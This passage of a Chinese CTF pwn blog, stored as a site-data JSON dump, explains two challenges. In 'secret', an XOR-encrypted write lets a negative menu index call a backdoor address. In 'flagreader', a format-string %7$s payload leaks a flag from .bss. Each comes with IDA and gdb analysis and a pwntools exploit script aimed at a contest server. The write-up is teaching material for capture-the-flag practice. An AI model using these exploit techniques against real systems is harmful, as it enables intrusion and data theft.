class=\"line\">payload+=p64(<span class=\"number\">59</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004012d3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"><span class=\"comment\">## </span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"secret\"><a href=\"#secret\" class=\"headerlink\" title=\"secret\"></a>secret</h2><h3 id=\"ida分析-1\"><a href=\"#ida分析-1\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><strong>先进行了一下小小的逆向，把一些变量和函数名字改了一下</strong></p>\n<h4 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524200824362.png\"><br>1.第一眼看到输入赋值给v3,但v3是数组。v3[0]是我们的选项<br>2.关于后续功能的实现有猫腻，<code>funcs[v3[0]-1]()</code>.稍微有点经验就能看出来，这是在调用funcs[]中的函数，那么funcs中到底有什么呢？跟进去看看。</p>\n<h4 id=\"funcs数组分析\"><a href=\"#funcs数组分析\" class=\"headerlink\" title=\"funcs数组分析\"></a>funcs数组分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201339633.png\" alt=\"image-20250524201339633\"><br>1.对ida熟悉一点，就知道这里存放的是函数的地址，分别就是menu中三个选项对应的函数。<br>2.所以假设前面的v3&#x3D;1，那么就会执行funcs[0],也就是加密。<br>3.理清了程序执行功能的逻辑，再来看每个功能。这题最关键的事encrypt，我在这里就自分析这个。</p>\n<h4 id=\"encrypt分析\"><a href=\"#encrypt分析\" class=\"headerlink\" title=\"encrypt分析\"></a>encrypt分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201727975.png\" alt=\"image-20250524201727975\"><br>1.首先会往abcd这里读入0x50字节的数据。<br>2.然后会对这些数据作加密处理，而加密的方式是与某个数组中的一个数，按位异或。<br>3.知道按位异或的作用，a^b&#x3D;c &#x3D;&#x3D;&gt; a&#x3D;b^c,因此，加密的结果再加密，就是原值。<br>4.用来加密的数组就是funcs图中的s1yner<br>5.abcd同样位于data段，并且里funcs很近。</p>\n<h4 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h4><p>1.第一个想法是通过Encrypt中的溢出，覆盖掉funcs的函数，为backdoor(题目留的后门函数，可以cat flag)。但是只有0x50字节，不够，只能刚好写满abcd那个数组。这里意识到，我们只能把后门写在abcd这个数组上。所以应该考虑有没有办法，访问到这里呢？<br>2.继续回去观察main函数，看到输入后会检测v3是否大于3。也就是小于等于3，都是合法的输入。试想，如果输入0，那么最后就是<code>func[-1]()</code>,也就是会调用我们最后输入的8字节的地址。因此，我们可以输入0 和 负数，来访问abcd上的地址。只要对应上。<br>3.那接下来就是解决，加密的问题。很简单，将log_level设置为debug，发送正常的backdoor地址，看看返回的加密内容是什么。然后手敲一下backdoor的地址，把加密后的内容作为原文发送，那么正确的地址就会在加密后被写上去。</p>\n<h3 id=\"gdb分析\"><a href=\"#gdb分析\" class=\"headerlink\" title=\"gdb分析\"></a>gdb分析</h3><h4 id=\"加密内容获取\"><a href=\"#加密内容获取\" class=\"headerlink\" title=\"加密内容获取\"></a>加密内容获取</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524203433694.png\" alt=\"image-20250524203433694\"><br>1.直接发送p64(backdoor)，查看加密的内容。<br>2.从后往前数，因为后面紧跟的是<code>1.Encrupt......</code>，从0x31 往前数8个字节，就是我们要的内容，然后直接发这个就行。</p>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;43.139.51.42&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">38403</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mode==<span class=\"number\">0</span> :</span><br><span class=\"line\">\tio=process(<span class=\"string\">&quot;./secret&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tio=remote(url,port)</span><br><span class=\"line\">\t</span><br><span class=\"line\">backdoor=<span class=\"number\">0x4014a7</span></span><br><span class=\"line\">offset=<span class=\"number\">0x40</span></span><br><span class=\"line\"></span><br><span class=\"line\">key=[<span class=\"string\">&quot;s&quot;</span>,<span class=\"string\">&quot;1&quot;</span>,<span class=\"string\">&quot;n&quot;</span>,<span class=\"string\">&quot;y&quot;</span>,<span class=\"string\">&quot;e&quot;</span>,<span class=\"string\">&quot;r&quot;</span>]</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">payload=offset*<span class=\"string\">b&#x27;a&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#payload+=p64(backdoor)</span></span><br><span class=\"line\">payload+=<span class=\"string\">b&#x27;\\xc2\\x66\\x33\\x31\\x6e\\x79\\x65\\x72&#x27;</span></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;&gt;&gt;&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"flagreader\"><a href=\"#flagreader\" class=\"headerlink\" title=\"flagreader\"></a>flagreader</h2><h3 id=\"ida分析-2\"><a href=\"#ida分析-2\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><h4 id=\"main函数分析-1\"><a href=\"#main函数分析-1\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204127748.png\" alt=\"image-20250524204127748\"><br>1.开幕雷击，直接就是一个gift给我们。显然是一个地址，可能需要这个地址泄露一些东西。<br>2.同时还有两个函数，一个readflag，一个vuln。直接跟进。</p>\n<h4 id=\"readflag函数分析\"><a href=\"#readflag函数分析\" class=\"headerlink\" title=\"readflag函数分析\"></a>readflag函数分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204334952.png\" alt=\"image-20250524204334952\"><br><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204424654.png\" alt=\"image-20250524204424654\"><br>1.首先看伪代码，发现是把flag读取了0x50字节，写在了<code>&amp;_bss_start[6]._IO_read_end</code>上。但是这个，到底是哪个地址呢？<br>2.观察汇编的代码，可以看到rsi也就读入的地址是rcx，而rcx 又是 rax+0x520，rax又是__bss_start.所以可以知道rsi&#x3D;__bss_start+0x520.<br>3.而我们的gift就是__bss_start.</p>\n<h4 id=\"vuln函数分析\"><a href=\"#vuln函数分析\" class=\"headerlink\" title=\"vuln函数分析\"></a>vuln函数分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204837954.png\" alt=\"image-20250524204837954\"><br>1.非常明显的格式化字符串漏洞，结合上文。第一个想到把flag的地址写入，同时用”%s”对flag内容进行打印。<br>2.64位要加上6，因为有前6个寄存器。最后的偏移还是需要gdb查看。因为可以输入0x10，所以可以把__bss_start+0x520布置在下面。</p>\n<h3 id=\"gdb分析-1\"><a href=\"#gdb分析-1\" class=\"headerlink\" title=\"gdb分析\"></a>gdb分析</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524205449833.png\" alt=\"image-20250524205449833\"><br>1.找到printf函数的栈帧，可以看到我们的输入是在偏移为0 的位置，加上6就是6.<br>2.把地址写在下面的话，偏移就是7。</p>\n<h3 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;43.139.51.42&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">38430</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mode==<span class=\"number\">0</span> :</span><br><span class=\"line\">\tio=process(<span class=\"string\">&quot;./flagreader&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tio=remote(url,port)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Here is your gift: &quot;</span>)</span><br><span class=\"line\">bss_start=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;bss-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(bss_start)))</span><br><span class=\"line\">flag=bss_start+<span class=\"number\">1312</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;%7$s&#x27;</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x41&#x27;</span>)</span><br><span class=\"line\">payload+=p64(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"}],"PostAsset":[],"PostCategory":[{"post_id":"cmglxf2i0000buomy7uk43j1m","category_id":"cmglxf2hy0006uomy5nowd1pm","_id":"cmglxf2i4000kuomy2eidaymj"},{"post_id":"cmglxf2hv0003uomy3ksw4a8n","category_id":"cmglxf2hy0006uomy5nowd1pm","_id":"cmglxf2i7000puomy2th95kfw"},{"post_id":"cmglxf2i1000duomy2dszckua","category_id":"cmglxf2hy0006uomy5nowd1pm","_id":"cmglxf2i8000tuomya6hs38pn"},{"post_id":"cmglxf2i3000huomya5iqbr81","category_id":"cmglxf2hy0006uomy5nowd1pm","_id":"cmglxf2i9000zuomy30p759b7"},{"post_id":"cmglxf2hx0005uomye0kf2n6v","category_id":"cmglxf2i2000euomyhz7g5ioq","_id":"cmglxf2ia0013uomyfb2nd4xr"},{"post_id":"cmglxf2i6000ouomy645oao6m","category_id":"cmglxf2hy0006uomy5nowd1pm","_id":"cmglxf2ia0017uomydvpb3miv"},{"post_id":"cmglxf2hz0009uomy4p9a39qv","category_id":"cmglxf2hy0006uomy5nowd1pm","_id":"cmglxf2ib001buomy53ox2a7x"},{"post_id":"cmglxf2i7000suomy3vw9bt46","category_id":"cmglxf2hy0006uomy5nowd1pm","_id":"cmglxf2ic001fuomyh12b4p2z"},{"post_id":"cmglxf2i9000yuomyf0rv1xul","category_id":"cmglxf2i8000vuomyhzxockj4","_id":"cmglxf2ic001iuomygbbq2vaa"},{"post_id":"cmglxf2i4000juomya30y86jl","category_id":"cmglxf2i8000vuomyhzxockj4","_id":"cmglxf2id001luomy0x2138t3"},{"post_id":"cmglxf2ib001euomydjg02t6w","category_id":"cmglxf2ib0019uomyc84o583a","_id":"cmglxf2id001puomy7ruy7vm4"},{"post_id":"cmglxf2ia0012uomy7u8a8c99","category_id":"cmglxf2ib0019uomyc84o583a","_id":"cmglxf2ie001suomyd6d79idx"},{"post_id":"cmglxf2ic001guomy1j5k3nai","category_id":"cmglxf2i2000euomyhz7g5ioq","_id":"cmglxf2ie001vuomy7s22dk3v"},{"post_id":"cmglxf2id001kuomyfk0q671w","category_id":"cmglxf2ib0019uomyc84o583a","_id":"cmglxf2if001xuomydo5502sf"},{"post_id":"cmglxf2ia0016uomy55856ad6","category_id":"cmglxf2ib0019uomyc84o583a","_id":"cmglxf2if0021uomy8zr4056w"},{"post_id":"cmglxf2id001nuomydt2df3p1","category_id":"cmglxf2ib0019uomyc84o583a","_id":"cmglxf2ig0024uomyfdafhsvv"},{"post_id":"cmglxf2ie001ruomydy2j9jv2","category_id":"cmglxf2i2000euomyhz7g5ioq","_id":"cmglxf2ig0027uomy2bn5cmsj"},{"post_id":"cmglxf2ib001auomyebow6wn1","category_id":"cmglxf2ib0019uomyc84o583a","_id":"cmglxf2ig0028uomy8i407sry"},{"post_id":"cmglxf2ie001uuomy34clcruv","category_id":"cmglxf2i2000euomyhz7g5ioq","_id":"cmglxf2ih002buomyaa7sh8el"},{"post_id":"cmglxf2ie001wuomy4rqb3sbn","category_id":"cmglxf2i2000euomyhz7g5ioq","_id":"cmglxf2ih002duomyfgos9vqy"},{"post_id":"cmglxf2if0020uomyhih9hhft","category_id":"cmglxf2i2000euomyhz7g5ioq","_id":"cmglxf2ih002guomycmmx763e"},{"post_id":"cmglxf2if0023uomyc07k8k7s","category_id":"cmglxf2i2000euomyhz7g5ioq","_id":"cmglxf2ih002iuomyaoyj3tsk"},{"post_id":"cmglxf2ig0026uomy0r6d2muu","category_id":"cmglxf2ih002auomyfg8sbxr5","_id":"cmglxf2ih002luomy41w169d4"},{"post_id":"cmglxf2in0041uomy678z1x4a","category_id":"cmglxf2ib0019uomyc84o583a","_id":"cmglxf2iq0046uomygze0dxgw"},{"post_id":"cmglxf2io0042uomyc3c2ccea","category_id":"cmglxf2hy0006uomy5nowd1pm","_id":"cmglxf2iq0047uomyarm25l5t"},{"post_id":"cmglxf2ip0044uomya49z0xic","category_id":"cmglxf2i2000euomyhz7g5ioq","_id":"cmglxf2iq004auomy2hdc6k6d"},{"post_id":"cmglxf2ip0045uomygtdo37eq","category_id":"cmglxf2hy0006uomy5nowd1pm","_id":"cmglxf2iq004cuomy1wrk8ea9"}],"PostTag":[{"post_id":"cmglxf2hv0003uomy3ksw4a8n","tag_id":"cmglxf2hz0007uomy8t6s8ugj","_id":"cmglxf2i7000quomy2z3t2lu2"},{"post_id":"cmglxf2hv0003uomy3ksw4a8n","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2i8000uuomybb5y2q1w"},{"post_id":"cmglxf2i6000ouomy645oao6m","tag_id":"cmglxf2hz0007uomy8t6s8ugj","_id":"cmglxf2i90010uomy687lfxgh"},{"post_id":"cmglxf2i6000ouomy645oao6m","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ia0014uomy9oml6qnd"},{"post_id":"cmglxf2hx0005uomye0kf2n6v","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ib0018uomy585i7vtr"},{"post_id":"cmglxf2hx0005uomye0kf2n6v","tag_id":"cmglxf2i8000wuomycpi5d1f7","_id":"cmglxf2ib001cuomybpk71ubh"},{"post_id":"cmglxf2hz0009uomy4p9a39qv","tag_id":"cmglxf2ia0015uomy7z5e8yur","_id":"cmglxf2id001muomydvuweomv"},{"post_id":"cmglxf2hz0009uomy4p9a39qv","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ie001quomy7q7e27ub"},{"post_id":"cmglxf2i0000buomy7uk43j1m","tag_id":"cmglxf2ic001juomybu1acsla","_id":"cmglxf2if001zuomy1uma0n9d"},{"post_id":"cmglxf2i0000buomy7uk43j1m","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2if0022uomy4hkb5jp4"},{"post_id":"cmglxf2i1000duomy2dszckua","tag_id":"cmglxf2if001yuomy6mgo0mg5","_id":"cmglxf2ih002cuomy7osefq80"},{"post_id":"cmglxf2i1000duomy2dszckua","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ih002euomy1omm42co"},{"post_id":"cmglxf2i3000huomya5iqbr81","tag_id":"cmglxf2ig0029uomy8ec966lm","_id":"cmglxf2ih002huomy593c1yyn"},{"post_id":"cmglxf2i3000huomya5iqbr81","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ih002juomy6ld39zw1"},{"post_id":"cmglxf2i4000juomya30y86jl","tag_id":"cmglxf2ih002fuomyfuucdetb","_id":"cmglxf2ii002nuomy5sv1hxz4"},{"post_id":"cmglxf2i4000juomya30y86jl","tag_id":"cmglxf2ih002kuomy7nui11wf","_id":"cmglxf2ii002ouomy72haadd2"},{"post_id":"cmglxf2i7000suomy3vw9bt46","tag_id":"cmglxf2ih002muomy37fi1tof","_id":"cmglxf2ii002quomy7qjv3vm6"},{"post_id":"cmglxf2i7000suomy3vw9bt46","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ii002ruomyg64ocgj4"},{"post_id":"cmglxf2i9000yuomyf0rv1xul","tag_id":"cmglxf2ih002fuomyfuucdetb","_id":"cmglxf2ii002uuomy4srf9km1"},{"post_id":"cmglxf2i9000yuomyf0rv1xul","tag_id":"cmglxf2ih002kuomy7nui11wf","_id":"cmglxf2ii002vuomyg37p7cfc"},{"post_id":"cmglxf2ia0012uomy7u8a8c99","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ii002xuomye8gf5i8z"},{"post_id":"cmglxf2ia0012uomy7u8a8c99","tag_id":"cmglxf2ii002tuomyh2ln84gx","_id":"cmglxf2ij002yuomy9h4x8mng"},{"post_id":"cmglxf2ia0016uomy55856ad6","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ij0030uomyft9vgccj"},{"post_id":"cmglxf2ia0016uomy55856ad6","tag_id":"cmglxf2ii002wuomyg03q3ray","_id":"cmglxf2ij0031uomyafrhakdu"},{"post_id":"cmglxf2ib001auomyebow6wn1","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ij0033uomyggbldnhm"},{"post_id":"cmglxf2ib001auomyebow6wn1","tag_id":"cmglxf2ij002zuomyg31m9fwb","_id":"cmglxf2ij0034uomy42g79p14"},{"post_id":"cmglxf2ib001euomydjg02t6w","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ij0036uomy1pdy71p7"},{"post_id":"cmglxf2ib001euomydjg02t6w","tag_id":"cmglxf2ij0032uomycq2rhzjk","_id":"cmglxf2ij0037uomy4kc69l4c"},{"post_id":"cmglxf2ic001guomy1j5k3nai","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ij0039uomy2rk71pc3"},{"post_id":"cmglxf2ic001guomy1j5k3nai","tag_id":"cmglxf2ij0035uomy2nyydxeg","_id":"cmglxf2ij003auomy0zmud8r9"},{"post_id":"cmglxf2id001kuomyfk0q671w","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ik003cuomy8zk0fb2p"},{"post_id":"cmglxf2id001kuomyfk0q671w","tag_id":"cmglxf2ij0038uomy0pzpaqch","_id":"cmglxf2ik003duomygaxo0wgp"},{"post_id":"cmglxf2id001nuomydt2df3p1","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ik003fuomyedswe4ls"},{"post_id":"cmglxf2id001nuomydt2df3p1","tag_id":"cmglxf2ij003buomydwrkgaqs","_id":"cmglxf2ik003guomy8ujr1ry8"},{"post_id":"cmglxf2ie001ruomydy2j9jv2","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ik003iuomy439nb61b"},{"post_id":"cmglxf2ie001ruomydy2j9jv2","tag_id":"cmglxf2ij0035uomy2nyydxeg","_id":"cmglxf2ik003juomy0l6fgg1n"},{"post_id":"cmglxf2ie001uuomy34clcruv","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2ik003luomya4sffvz1"},{"post_id":"cmglxf2ie001uuomy34clcruv","tag_id":"cmglxf2ij0035uomy2nyydxeg","_id":"cmglxf2ik003muomy0ht976c8"},{"post_id":"cmglxf2ie001wuomy4rqb3sbn","tag_id":"cmglxf2ij0035uomy2nyydxeg","_id":"cmglxf2il003puomy62601ipm"},{"post_id":"cmglxf2ie001wuomy4rqb3sbn","tag_id":"cmglxf2il003nuomyctot4t81","_id":"cmglxf2il003quomy5mx8hd4k"},{"post_id":"cmglxf2if0020uomyhih9hhft","tag_id":"cmglxf2il003ouomy56hx7t2f","_id":"cmglxf2il003tuomyhwc0bdhf"},{"post_id":"cmglxf2if0020uomyhih9hhft","tag_id":"cmglxf2il003ruomy1mvwhyox","_id":"cmglxf2il003uuomy73ko4qn3"},{"post_id":"cmglxf2if0023uomyc07k8k7s","tag_id":"cmglxf2il003ouomy56hx7t2f","_id":"cmglxf2im003xuomy9wv35uzm"},{"post_id":"cmglxf2if0023uomyc07k8k7s","tag_id":"cmglxf2il003ruomy1mvwhyox","_id":"cmglxf2im003yuomyflj2dm52"},{"post_id":"cmglxf2ig0026uomy0r6d2muu","tag_id":"cmglxf2im003wuomy9n7pb2h3","_id":"cmglxf2im003zuomyheo285g3"},{"post_id":"cmglxf2ig0026uomy0r6d2muu","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2im0040uomy4qw8cg6g"},{"post_id":"cmglxf2ip0045uomygtdo37eq","tag_id":"cmglxf2ia0015uomy7z5e8yur","_id":"cmglxf2iq0049uomy3x0z7p1g"},{"post_id":"cmglxf2ip0045uomygtdo37eq","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2iq004buomye9w31c6v"},{"post_id":"cmglxf2in0041uomy678z1x4a","tag_id":"cmglxf2ip0043uomybfdw7l1o","_id":"cmglxf2iq004euomy0gxh9taj"},{"post_id":"cmglxf2in0041uomy678z1x4a","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2iq004fuomyc9vmaiwm"},{"post_id":"cmglxf2io0042uomyc3c2ccea","tag_id":"cmglxf2iq0048uomyatdl7f42","_id":"cmglxf2iq004guomy75w393ya"},{"post_id":"cmglxf2io0042uomyc3c2ccea","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2iq004huomyho725z56"},{"post_id":"cmglxf2ip0044uomya49z0xic","tag_id":"cmglxf2ip0043uomybfdw7l1o","_id":"cmglxf2iq004iuomydnb733jx"},{"post_id":"cmglxf2ip0044uomya49z0xic","tag_id":"cmglxf2i2000fuomyg23w454e","_id":"cmglxf2iq004juomycsq4c0fe"}],"Tag":[{"name":"XCTF","_id":"cmglxf2hz0007uomy8t6s8ugj"},{"name":"pwn","_id":"cmglxf2i2000fuomyg23w454e"},{"name":"非栈上格式化字符串","_id":"cmglxf2i8000wuomycpi5d1f7"},{"name":"新生赛","_id":"cmglxf2ia0015uomy7z5e8yur"},{"name":"heap","_id":"cmglxf2ic001juomybu1acsla"},{"name":"中等难度","_id":"cmglxf2if001yuomy6mgo0mg5"},{"name":"fmt","_id":"cmglxf2ig0029uomy8ec966lm"},{"name":"漏洞复现","_id":"cmglxf2ih002fuomyfuucdetb"},{"name":"iot","_id":"cmglxf2ih002kuomy7nui11wf"},{"name":"house of XXX","_id":"cmglxf2ih002muomy37fi1tof"},{"name":"unlink","_id":"cmglxf2ii002tuomyh2ln84gx"},{"name":"堆风水","_id":"cmglxf2ii002wuomyg03q3ray"},{"name":"堆块重叠","_id":"cmglxf2ij002zuomyg31m9fwb"},{"name":"tcachebin dup","_id":"cmglxf2ij0032uomycq2rhzjk"},{"name":"House of XXX","_id":"cmglxf2ij0035uomy2nyydxeg"},{"name":"UAF","_id":"cmglxf2ij0038uomy0pzpaqch"},{"name":"IO_FILE","_id":"cmglxf2ij003buomydwrkgaqs"},{"name":"IO","_id":"cmglxf2il003nuomyctot4t81"},{"name":"堆利用","_id":"cmglxf2il003ouomy56hx7t2f"},{"name":"tcache","_id":"cmglxf2il003ruomy1mvwhyox"},{"name":"syscall","_id":"cmglxf2im003wuomy9n7pb2h3"},{"name":"mips","_id":"cmglxf2ip0043uomybfdw7l1o"},{"name":"随机时间","_id":"cmglxf2iq0048uomyatdl7f42"}]}}